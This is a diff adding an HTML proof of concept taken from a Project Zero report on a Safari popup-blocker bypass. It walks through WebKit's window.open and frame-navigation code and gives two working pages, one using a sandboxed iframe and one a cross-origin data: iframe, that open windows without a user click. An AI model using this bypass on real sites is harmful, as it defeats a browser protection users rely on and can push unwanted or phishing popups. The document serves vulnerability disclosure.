@@ -1,0 +1,137 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1050
+
+The second argument of window.open is a name for the new window. If there's a frame that has same name, it will try to load the URL in that. If not, it just tries to create a new window and pop-up. But without the user's click event, its attempt will fail.
+
+Here's some snippets.
+
+RefPtr<DOMWindow> DOMWindow::open(const String& urlString, const AtomicString& frameName, const String& windowFeaturesString,
+    DOMWindow& activeWindow, DOMWindow& firstWindow)
+{
+    ...
+    ---------------- (1) -----------------------
+    if (!firstWindow.allowPopUp()) { <<---- checks there's the user's click event.
+        // Because FrameTree::find() returns true for empty strings, we must check for empty frame names.
+        // Otherwise, illegitimate window.open() calls with no name will pass right through the popup blocker.
+        if (frameName.isEmpty() || !m_frame->tree().find(frameName))
+            return nullptr;
+    }
+    --------------------------------------------
+    ...
+    RefPtr<Frame> result = createWindow(urlString, frameName, parseWindowFeatures(windowFeaturesString), activeWindow, *firstFrame, *m_frame);
+    return result ? result->document()->domWindow() : nullptr;
+}
+
+
+RefPtr<Frame> DOMWindow::createWindow(const String& urlString, const AtomicString& frameName, const WindowFeatures& windowFeatures, DOMWindow& activeWindow, Frame& firstFrame, Frame& openerFrame, std::function<void (DOMWindow&)> prepareDialogFunction)
+{
+    ...
+    RefPtr<Frame> newFrame = WebCore::createWindow(*activeFrame, openerFrame, frameRequest, windowFeatures, created);
+    if (!newFrame)
+        return nullptr;
+
+    ...
+}
+
+RefPtr<Frame> createWindow(Frame& openerFrame, Frame& lookupFrame, const FrameLoadRequest& request, const WindowFeatures& features, bool& created)
+{
+    ASSERT(!features.dialog || request.frameName().isEmpty());
+
+    created = false;
+
+    ---------------- (2) -----------------------
+    if (!request.frameName().isEmpty() && request.frameName() != "_blank") {
+        if (RefPtr<Frame> frame = lookupFrame.loader().findFrameForNavigation(request.frameName(), openerFrame.document())) {
+            if (request.frameName() != "_self") {
+                if (Page* page = frame->page())
+                    page->chrome().focus();
+            }
+            return frame;
+        }
+    }
+    --------------------------------------------
+
+    <<<<<----------- failed to find the frame, creates a new one.
+    ...
+}
+
+The logic of the code (1) depends on the assumption that if |m_frame->tree().find(frameName)| succeeds, |lookupFrame.loader().findFrameForNavigation| at (2) will also succeed. If we could make |m_frame->tree().find(frameName)| succeed but |lookupFrame.loader().findFrameForNavigation| fail, a new window will be created and popped up without the user's click event.
+
+
+
+Let's look into |findFrameForNavigation|.
+
+Frame* FrameLoader::findFrameForNavigation(const AtomicString& name, Document* activeDocument)
+{
+    Frame* frame = m_frame.tree().find(name);
+
+    // FIXME: Eventually all callers should supply the actual activeDocument so we can call canNavigate with the right document.
+    if (!activeDocument)
+        activeDocument = m_frame.document();
+
+    if (!activeDocument->canNavigate(frame))
+        return nullptr;
+
+    return frame;
+}
+
+bool Document::canNavigate(Frame* targetFrame)
+{
+    ...
+    if (isSandboxed(SandboxNavigation)) { <<<--------------- (1)
+        if (targetFrame->tree().isDescendantOf(m_frame))
+            return true;
+
+        const char* reason = "The frame attempting navigation is sandboxed, and is therefore disallowed from navigating its ancestors.";
+        if (isSandboxed(SandboxTopNavigation) && targetFrame == &m_frame->tree().top())
+            reason = "The frame attempting navigation of the top-level window is sandboxed, but the 'allow-top-navigation' flag is not set.";
+
+        printNavigationErrorMessage(targetFrame, url(), reason);
+        return false;
+    }
+
+    ...
+
+    if (canAccessAncestor(securityOrigin(), targetFrame)) <<<------------------- (2)
+        return true;
+
+    ...
+
+    return false;
+}
+
+There are two points to make |Document::canNavigate| return false.
+
+(1). Using a sandboxed iframe.
+<body>
+<iframe name="one"></iframe>
+<iframe id="two" sandbox="allow-scripts allow-same-origin allow-popups"></iframe>
+
+<script>
+function main() {
+    two.eval('open("https://abc.xyz", "one");');
+}
+
+main()
+</script>
+</body>
+
+(2). Using a cross-origin iframe.
+-->
+
+<body>
+<iframe name="one"></iframe>
+
+<script>
+function main() {
+    document.body.appendChild(document.createElement("iframe")).contentDocument.location =
+        "data:text/html,<script>open('https://abc.xyz', 'one')</scri" + "pt>";
+}
+
+main()
+</script>
+</body>
+
+<!--
+Tested on Safari 10.0.2 (12602.3.12.0.1).
+-->
